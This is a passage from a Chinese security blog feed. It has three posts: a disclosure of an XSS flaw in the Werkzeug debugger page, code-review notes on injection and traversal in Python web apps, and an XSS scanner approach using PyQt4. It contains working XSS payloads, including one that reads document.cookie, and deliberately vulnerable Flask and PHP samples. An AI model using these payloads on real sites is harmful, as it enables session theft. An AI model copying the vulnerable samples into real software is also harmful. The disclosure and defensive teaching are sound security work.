<p>我以前曾经在<a href="http://blog.neargle.com/2016/07/25/log-of-simple-code-review-about-python-base-webapp/#XSS">记一下PythonWeb代码审计应该注意的地方</a>提及PythonWeb开发中容易容易产生XSS的几种情况，其中提到：</p>
<blockquote>
<p>如果webapp没有使用模板语言的话，又没有对用户输入进行过滤直接返回给客户端的话，就容易产生XSS。</p>
</blockquote>
<p>Flask的程序员显然不会犯这样的错误，我可以看一下werkzeug/debug/tbtools.py这个文件。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">PAGE_HTML = HEADER + <span class="string">u'''\</span><br><span class="line">&lt;h1&gt;%(exception_type)s&lt;/h1&gt;</span><br><span class="line">&lt;div class="detail"&gt;</span><br><span class="line">  &lt;p class="errormsg"&gt;%(exception)s&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;h2 class="traceback"&gt;Traceback &lt;em&gt;(most recent call last)&lt;/em&gt;&lt;/h2&gt;</span><br><span class="line">%(summary)s</span><br><span class="line">&lt;div class="plain"&gt;</span><br><span class="line">  &lt;form action="/?__debugger__=yes&amp;amp;cmd=paste" method="post"&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">      &lt;input type="hidden" name="language" value="pytb"&gt;</span><br><span class="line">      This is the Copy/Paste friendly version of the traceback.  &lt;span</span><br><span class="line">      class="pastemessage"&gt;You can also paste this traceback into</span><br><span class="line">      a &lt;a href="https://gist.github.com/"&gt;gist&lt;/a&gt;:</span><br><span class="line">      &lt;input type="submit" value="create paste"&gt;&lt;/span&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;textarea cols="50" rows="10" name="code" readonly&gt;%(plaintext)s&lt;/textarea&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class="explanation"&gt;</span><br><span class="line">  The debugger caught an exception in your WSGI application.  You can now</span><br><span class="line">  look at the traceback which led to the error.  &lt;span class="nojavascript"&gt;</span><br><span class="line">  If you enable JavaScript you can also use additional features such as code</span><br><span class="line">  execution (if the evalex feature is enabled), automatic pasting of the</span><br><span class="line">  exceptions and much more.&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">'''</span> + FOOTER + <span class="string">'''</span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line">%(plaintext_cs)s</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line">'''</span></span><br></pre></td></tr></table></figure>
<p>可以发现Debugger页面是以字符串拼接和字符串格式化的形式构成的。这个字符串可以传进五个变量，分别是exception_type, exception, summary, plaintext, plaintext_cs。看变量名就可以知道，应该是一些异常信息。这些信息由render_full函数填充进字符串。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">render_full</span><span class="params">(self, evalex=False, secret=None,</span><br><span class="line">                evalex_trusted=True)</span>:</span></span><br><span class="line">    <span class="string">"""Render the Full HTML page with the traceback info."""</span></span><br><span class="line">    exc = escape(self.exception)</span><br><span class="line">    <span class="keyword">return</span> PAGE_HTML % &#123;</span><br><span class="line">        <span class="string">'evalex'</span>:           evalex <span class="keyword">and</span> <span class="string">'true'</span> <span class="keyword">or</span> <span class="string">'false'</span>,</span><br><span class="line">        <span class="string">'evalex_trusted'</span>:   evalex_trusted <span class="keyword">and</span> <span class="string">'true'</span> <span class="keyword">or</span> <span class="string">'false'</span>,</span><br><span class="line">        <span class="string">'console'</span>:          <span class="string">'false'</span>,</span><br><span class="line">        <span class="string">'title'</span>:            exc,</span><br><span class="line">        <span class="string">'exception'</span>:        exc,</span><br><span class="line">        <span class="string">'exception_type'</span>:   escape(self.exception_type),</span><br><span class="line">        <span class="string">'summary'</span>:          self.render_summary(include_title=<span class="keyword">False</span>),</span><br><span class="line">        <span class="string">'plaintext'</span>:        self.plaintext,</span><br><span class="line">        <span class="string">'plaintext_cs'</span>:     re.sub(<span class="string">'-&#123;2,&#125;'</span>, <span class="string">'-'</span>, self.plaintext),</span><br><span class="line">        <span class="string">'traceback_id'</span>:     self.id,</span><br><span class="line">        <span class="string">'secret'</span>:           secret</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>代码里使用了escape函数过滤了异常信息和异常类型，但是这两行代码引起了我注意。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'plaintext'</span>:        self.plaintext,</span><br><span class="line"><span class="string">'plaintext_cs'</span>:     re.sub(<span class="string">'-&#123;2,&#125;'</span>, <span class="string">'-'</span>, self.plaintext),</span><br></pre></td></tr></table></figure>
<p>self.plaintext依然包含着异常信息：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_plaintext_traceback</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""Like the plaintext attribute but returns a generator"""</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="string">u'Traceback (most recent call last):'</span></span><br><span class="line">    <span class="keyword">for</span> frame <span class="keyword">in</span> self.frames:</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">u'  File "%s", line %s, in %s'</span> % (</span><br><span class="line">            frame.filename,</span><br><span class="line">            frame.lineno,</span><br><span class="line">            frame.function_name</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">u'    '</span> + frame.current_line.strip()</span><br><span class="line">    <span class="keyword">yield</span> self.exception</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plaintext</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'\n'</span>.join(self.generate_plaintext_traceback())</span><br><span class="line">plaintext = cached_property(plaintext)</span><br></pre></td></tr></table></figure>
<p>plaintext_cs是放在html注释内的完整异常信息，为了避免异常内出现<code>--&gt;</code>闭合之前的注释符，这里会把重复的<code>-</code>替换为一个<code>-</code>，但是plaintext没有经过任何处理，plaintext放在一个textarea里，显然我们的Flask程序员们没有想到异常信息会闭合textarea而造成问题。</p>
<p>这样思路就清晰了：</p>
<ol>
<li>我们需要在Flask的WebApp产生一个异常，以至于它能返回Debugger页面。</li>
<li>我们需要一个异常信息内包含着我们所构造数据的异常，以便我们构造payload字符串</li>
</ol>
<p>很巧，把字符串转换成数字的常用函数int()就拥有这样的特性。</p>
<p>于是我们写了一个小Demo:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route("/xss-debug-test/", methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xss_debug_test</span><span class="params">()</span>:</span></span><br><span class="line">    id = int(request.form[<span class="string">'id'</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"XSS"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
<p>接下来的活就是普通的XSS构造payload了。只要闭合前面的textarea标签即可。</p>
<p>例如：</p>
<p><code>&lt;/textarea&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code> 或</p>
<p><code>id=&lt;/textarea&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5jw1f81d0kijo7j30ym0cyq85.jpg" alt=""></p>
<p>写了一个脚本稍微跑了一下，int()的这个异常最多含有200个字符串值，如果传入的字符串长度大于200，就会截取前200位。然而200位的payload已经足够我们构造所有xss利用代码了。</p>
<h1 id="修复">修复</h1><p>我自己提交的修复代码，官方也采用了，只是加了过滤而已。现在的话，只要运行<code>pip install -U werkzeug</code>，把werkzeug更新到0.10.11版本就没事了。当然更重要的是，任何框架的debug模式都不要放到生产环境。</p>
<h1 id="待续">待续</h1><p>我当时还有几个小想法，一个就是想思考如何通过一个简单的脚本获取看啊可能那些常见的字符串处理函数其产生的异常，是带有字符串值的，另一个就是经P牛提醒如果可以构造Payload的去获取pin码的话，就可直接代码执行了。</p>
<p>但是一来是Debug模式在线上确实不多见，所以这个洞影响也不是特别大。二来也要忙着审计php和找工作就没再花时间在这上面了。等有时间再好好弄弄。</p>
<h1 id="参考">参考</h1><p><a href="https://github.com/pallets/werkzeug/commits?author=neargle" target="_blank" rel="external">https://github.com/pallets/werkzeug/commits?author=neargle</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/005y7Ba5jw1f81cs6bp5lj31130httgm.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;前段时间发现较为鸡肋的洞和当时写的文章。&lt;/p&gt;
&lt;p&gt;一个存在于Flask框架Debugger页面上的通用XSS，Werkzeug0.10.10之前版本受影响，已经报告给Flask官方并提交修复代码。官方在确认之后，及时发布了0.10.11。&lt;/p&gt;
&lt;p&gt;记下了发现的过程。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="http://blog.neargle.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>记一下PythonWeb代码审计应该注意的地方</title>
    <link href="http://blog.neargle.com/2016/07/25/log-of-simple-code-review-about-python-base-webapp/"/>
    <id>http://blog.neargle.com/2016/07/25/log-of-simple-code-review-about-python-base-webapp/</id>
    <published>2016-07-25T10:39:07.000Z</published>
    <updated>2016-09-20T14:34:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>读<a href="https://security.openstack.org/guidelines/dg_using-file-paths.html" target="_blank" rel="external">《Code Review For Python-Based Web Apps》</a>（《PythonWebApp代码审计》）做的笔记,正好自己也在写相关的文章：<a href="http://blog.neargle.com/2016/07/22/pythonweb-framework-dev-vulnerable/">讨论PythonWeb开发中可能会遇到的安全问题</a>,所以就翻译了一下作者原文，省去一些不必要的口水，并添加了一些自己的想法。</p>
<h2 id="SQL注入">SQL注入</h2><p>安全的做法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stmt = <span class="string">"SELECT * FROM table WHERE id=?"</span></span><br><span class="line">connection.execute(stmt, (value,))</span><br></pre></td></tr></table></figure>
<p>不安全的做法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"SELECT * FROM table WHERE id="</span> + value</span><br><span class="line"><span class="string">"SELECT * FROM table WHERE id=%s"</span> % value</span><br><span class="line"><span class="string">"SELECT * FROM table WHERE id=&#123;0&#125;"</span>.format(value)</span><br></pre></td></tr></table></figure></p>
<p>大部分Python操作数据库的第三方模块，如pymysql、sqlite3等，执行sql语句的函数，都支持参数化查询，如上安全的做法所示，可以给sql语句传递参数，这个参数经过过滤。而下面的字符串拼接是不经过过滤。所以会出现sql注入。</p>
<a id="more"></a>
<h2 id="命令执行">命令执行</h2><p>危险的函数或模块列表：</p>
<ul>
<li>os.popen*</li>
<li>os.system</li>
<li>os.spawn*</li>
<li>os.fork</li>
<li>os.exec*</li>
<li>popen2.*</li>
<li>commands.*</li>
<li>subprocess.call</li>
</ul>
<p>这里着重说明了，subprocess.call函数：</p>
<p>危险的用法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subprocess.call(<span class="string">"cat "</span> + user_input, shell=<span class="keyword">True</span>)</span><br><span class="line">subprocess.call(<span class="string">"cat %s"</span> % user_input, shell=<span class="keyword">True</span>)</span><br><span class="line">subprocess.call(<span class="string">"cat &#123;0&#125;"</span>.format(user_input), shell=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
<p>这里说一下shell这个参数的作用，如果shell为True，subprocess.call会给予更大的权限，因为使用<code>shell=True</code>, subprocess.call会在命令前添加<code>/bin/sh -c</code>（windows是<code>cmd.exe /c</code>）。测试：</p>
<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5jw1f66aitab2zj30q10esgre.jpg" alt=""></p>
<p>执行subprocess.call函数的几点建议：</p>
<ol>
<li>使用pipes.quote()函数去过滤用户输入，可以过滤命令拼接</li>
<li>尽量不要使用shell=True</li>
<li>即使不使用shell=True，也尽量去过滤用户输入</li>
<li>如果用户的输入是路径的话，可以使用下面目录遍历的防护方法进行防护</li>
</ol>
<h2 id="目录遍历">目录遍历</h2><p>危险的代码例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">open(user_input)</span><br><span class="line">os.fdopen(user_input)</span><br></pre></td></tr></table></figure>
<p>防护思路：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cwd = os.getcwd()</span><br><span class="line"><span class="keyword">if</span> os.path.abspath(user_input).startswith(cwd) <span class="keyword">is</span> <span class="keyword">True</span>:</span><br><span class="line">    open(user_input)</span><br></pre></td></tr></table></figure>
<p>abspath是获取绝对路径，这段代码的意思就是限定用户读取的目录为当前目录。我们可以把<code>os.getcwd()</code>替换成<code>os.path.realpath</code>限定当前目录下的任意子目录。</p>
<p><img src="http://ww4.sinaimg.cn/large/005y7Ba5jw1f66bh4fkmzj30d401ujri.jpg" alt=""></p>
<h2 id="XSS">XSS</h2><p>原作者提到如果webapp没有使用模板语言的话，又没有使用cgi.escape()对用户输入进行过滤直接加到程序返回给客户端的情况，就会产生XSS。cgi.escape()函数会把&lt;&gt;尖括号转化为html实体编码，如果使用cgi.escape(user_input, True)，会把’”单引号双引号也转成实体编码。</p>
<p><img src="http://ww3.sinaimg.cn/large/005y7Ba5jw1f66btoa2u4j30hl06hq4k.jpg" alt=""></p>
<p>其实就算使用了模板语言也很容易产生XSS。因为每一个模板语言都有一个可以不转义<code>&lt;&gt;&#39;&quot;</code>等html特殊字符的选项。以jinja2为例，jinja2默认会对所有传进来的变量进行转义，但有下面两种情况是例外的：</p>
<ol>
<li>传进的变量是一个<code>MarkupSafe.Markup</code>对象，例如<code>MarkupSafe.Markup(&#39;&lt;script&gt;alert(1)&lt;/script&gt;&gt;&#39;)</code></li>
<li>该模板使用|safe进行标记，例如<code></code></li>
</ol>
<p>以上两种情况，就算你使用了jinja2模板传入参数也有可能会产生Xss。当然如果你直接把用户输入拼接到模板中，也同样会产生XSS，不过那会产生更加严重的SSTI。</p>
<h2 id="异常处理">异常处理</h2><p>这里作者提到了异常处理的正确方式，其实我觉得并不只在Python里面有，是大部分程序员在开发时候的通病。处理异常的时候直接pass，不回显，也不记录异常信息，不分类处理异常，导致错误无法跟踪。这里我推荐看一下：<code>https://www.zhihu.com/question/29459586</code>中pig pig的回答，他的描述比原作者要详细一些。</p>
<p>至于这个我觉得超出了安全审计的范围，是代码规范和软件测试的范畴。在这里就不说明了。</p>
<p><a href="http://blog.neargle.com/2016/07/25/log-of-simple-code-review-about-python-base-webapp/">http://blog.neargle.com/2016/07/25/log-of-simple-code-review-about-python-base-webapp/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;读&lt;a href=&quot;https://security.openstack.org/guidelines/dg_using-file-paths.html&quot;&gt;《Code Review For Python-Based Web Apps》&lt;/a&gt;（《PythonWebApp代码审计》）做的笔记,正好自己也在写相关的文章：&lt;a href=&quot;http://blog.neargle.com/2016/07/22/pythonweb-framework-dev-vulnerable/&quot;&gt;讨论PythonWeb开发中可能会遇到的安全问题&lt;/a&gt;,所以就翻译了一下作者原文，省去一些不必要的口水，并添加了一些自己的想法。&lt;/p&gt;
&lt;h2 id=&quot;SQL注入&quot;&gt;SQL注入&lt;/h2&gt;&lt;p&gt;安全的做法：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;stmt = &lt;span class=&quot;string&quot;&gt;&quot;SELECT * FROM table WHERE id=?&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;connection.execute(stmt, (value,))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不安全的做法：&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;SELECT * FROM table WHERE id=&quot;&lt;/span&gt; + value&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;SELECT * FROM table WHERE id=%s&quot;&lt;/span&gt; % value&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;SELECT * FROM table WHERE id=&amp;#123;0&amp;#125;&quot;&lt;/span&gt;.format(value)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;大部分Python操作数据库的第三方模块，如pymysql、sqlite3等，执行sql语句的函数，都支持参数化查询，如上安全的做法所示，可以给sql语句传递参数，这个参数经过过滤。而下面的字符串拼接是不经过过滤。所以会出现sql注入。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="http://blog.neargle.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>使用PyQt4.QtWebKit降低自动化XSS检测的误报</title>
    <link href="http://blog.neargle.com/2016/07/23/a-think-of-automatic-xss-detection-used-python-qt4/"/>
    <id>http://blog.neargle.com/2016/07/23/a-think-of-automatic-xss-detection-used-python-qt4/</id>
    <published>2016-07-23T08:35:00.000Z</published>
    <updated>2016-07-27T06:56:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>一直以来的一个想法，现在有新的思路的就写出来看看。</p>
<p>自动化Web漏洞扫描器是渗透测试亘古不变的话题。把当前一直重复的手工劳动和新的思路转化为自动化工具，利用技术和程序实现为自己节省时间是一件非常有趣的事情。然而，自动化的路坑却不少。其中误报就是一件比较蛋疼的事情，XSS的误报尤其蛋疼。当前众多扫描器的XSS插件都存在误报的情况，我们来看一下大部分扫描器的XSS检测思路，我写了一个简单的Python函数来描述它，当然实际的通用XSS检测插件肯定会比这个要复杂的多,我只截取了一部分来说明思路：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xss_detect</span><span class="params">(method=<span class="string">'GET'</span>, querylist=[], url=<span class="string">''</span>)</span>:</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    resp = <span class="keyword">None</span></span><br><span class="line">    <span class="comment"># 这里有更多的payload,如onfocus=alert(2333)</span></span><br><span class="line">    payload = <span class="string">'--&gt;\'"&gt;&lt;script&gt;alert(1);&lt;/script&gt;'</span> </span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">for</span> query <span class="keyword">in</span> querylist:</span><br><span class="line">            <span class="comment"># url = '&#123;url&#125;?&#123;query&#125;=&#123;payload&#125;'.format(url=url,query=query,payload=payload)</span></span><br><span class="line">            params[query] = payload</span><br><span class="line">        resp = requests.get(url, params=params, headers=headers)</span><br><span class="line">    <span class="comment"># 此处省略POST</span></span><br><span class="line">    <span class="keyword">if</span> resp:</span><br><span class="line">        <span class="comment"># 这里有更多的正则匹配规则</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&lt;script&gt;alert(1);&lt;/script&gt;'</span> <span class="keyword">in</span> resp.content:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>再准备一个有XSS漏洞的php脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$id</span>;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试：</p>
<p><img src="http://ww3.sinaimg.cn/large/005y7Ba5jw1f63n1cwkv5j30r70c7jt9.jpg" alt=""></p>
<p><img src="http://ww2.sinaimg.cn/large/005y7Ba5jw1f63n2huod6j30ep030dg3.jpg" alt=""></p>
<p>由脚本可知，当前的XSS自动化测试思路一般都是给GET或POST参数传入Payload，并正则匹配检测返回的响应中是否含有我们构造payload的完整的html标签（不一定是<code>&lt;script&gt;</code>标签，见过用<code>&lt;H1&gt;</code>的=.=），如果有则判断该页面含有XSS漏洞。</p>
<p>这里的误区在于html页面含有闭合的<code>&lt;script&gt;</code>含有payload的标签，是否就代表JS可执行呢？</p>
<p>我们来看下面这种情况:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基于黑名单的过滤</span></span><br><span class="line"><span class="variable">$black_list</span>  = <span class="keyword">array</span>(<span class="string">'"'</span>, <span class="string">"'"</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$id</span> = str_replace(<span class="variable">$value</span>, <span class="string">''</span>, <span class="variable">$id</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;input type="text" name="" value="'</span> .<span class="variable">$id</span>. <span class="string">'"&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>该php脚本过滤掉了双引号和单引号，并把GET请求中获得的参数添加的input的value属性中，这种情况依照原本xss检测的方法，会出现误报，即虽然从http返回中能检测到闭合完整的<code>&lt;script&gt;</code>标签，但实际该js是不执行的。</p>
<p><img src="http://ww3.sinaimg.cn/large/005y7Ba5jw1f63t4xl66lj30ho0623z3.jpg" alt=""></p>
<p>其余会产生类似误报的情况也很多，这是一直困扰我的一个问题。直至我在前天重新温习爬虫知识的时候，把爬虫的某项知识和这个联系在了一起，有了一个新的思路。</p>
<p>在SQL注入的自动化检测里面，我们会力求出数据或输出由SQL语句生成的字符串，我们的正则是去匹配sql生成字符串而非sql语句，这样能保证sql语句正确执行了。例如我们payload是<code>select md5(0x2333333)</code>，正则匹配查找<code>5e2e9b556d77c86ab48075a94740b6f7</code>，这样就能大幅度减小误报率。那XSS是否也能用这样的思路呢？可惜的是，几乎所有的http请求库都不会返回js执行之后的结果而只会返回未执行的js代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> requests</span><br><span class="line">In [<span class="number">3</span>]: r = requests.get(<span class="string">'http://127.0.0.1:8080/html.html'</span>)</span><br><span class="line">In [<span class="number">4</span>]: r.content</span><br><span class="line">Out[<span class="number">4</span>]: <span class="string">'&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;111&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;script type="text/javascript"&gt;\n    document.body.appendChild(document.createTextNode(String.fromCharCode(84,48,48,76,83)));\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;'</span></span><br></pre></td></tr></table></figure>
<p><img src="http://ww2.sinaimg.cn/large/005y7Ba5jw1f63uwv7ng3j30de0693yx.jpg" alt=""></p>
<p>很明显requests库不会像浏览器一样去执行JavaScript。既然requests库不行，那么是不是有其它Python库可以实现模拟浏览器执行js，返回被js操作过的dom树的情况呢？<code>python-qt4</code>有可以模拟浏览器操作的Web工具库，只要是浏览器支持的操作它一般都能模拟。使用PyQt4.QtWebKit就可以执行js，返回js执行之后的结果。我们写一个小demo来验证一下该想法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">from</span> PyQt4.QtGui <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> PyQt4.QtCore <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> PyQt4.QtWebKit <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Render</span><span class="params">(QWebPage)</span>:</span>  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span>  </span><br><span class="line">    self.app = QApplication(sys.argv)  </span><br><span class="line">    QWebPage.__init__(self)  </span><br><span class="line">    self.loadFinished.connect(self._loadFinished)  </span><br><span class="line">    self.mainFrame().load(QUrl(url))  </span><br><span class="line">    self.app.exec_()</span><br><span class="line">  </span><br><span class="line">  <span 